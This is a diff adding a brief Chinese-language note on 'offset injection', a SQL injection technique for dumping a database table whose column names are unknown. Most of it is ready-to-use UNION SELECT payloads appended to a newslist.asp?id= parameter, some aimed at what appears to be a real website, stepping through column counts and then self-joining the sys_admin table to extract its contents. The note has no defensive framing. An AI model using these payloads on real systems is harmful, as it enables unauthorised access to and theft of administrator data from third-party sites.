@@ -1,0 +1,22 @@
+偏移注入适用于Access和Mysql数据库 在知道表名，但是猜解不出列名的情况下
+
+union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sj_admin
+
+
+1、测试字段
+http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #错误
+http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin     #错误
+http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin        #错误
+
+直到.........
+http://www.test.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确
+
+说明了sys_admin表下有11个字段。
+偏移注入的基本公式为:
+           order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案
+　　　　也就是18-11=7
+　　　　　　　18-7*2=4
+
+
+2、开始注入
+newslist.asp?id=688 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)
